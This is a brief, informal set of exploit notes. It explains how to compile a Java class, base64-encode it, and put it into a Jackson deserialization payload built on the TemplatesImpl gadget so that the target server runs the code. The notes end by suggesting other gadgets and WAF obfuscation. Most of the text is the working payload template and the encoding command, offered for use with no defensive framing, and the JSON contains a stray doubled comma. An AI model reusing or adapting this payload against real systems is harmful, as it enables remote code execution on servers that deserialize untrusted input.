Once you compile the Exploit.java, => Exploit.class

`cat Exploit.class | base64 -w 0 > bytecode.b64`


You want to insert it into the JSON you want jackson to eat.

```
{'id': 124,
  'obj':[ 'com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl',
  {
    'transletBytecodes' : [ 'AAIAZQ==' ], , // <=== INSERT YOUR BYTECODE THERE
    'transletName' : 'a.b',
    'outputProperties' : { }
  }
  ]
}
```

Alternate endings. I think this is an old pattern, explore other things that can execute the byte code.
WAF Obfuscation etc...


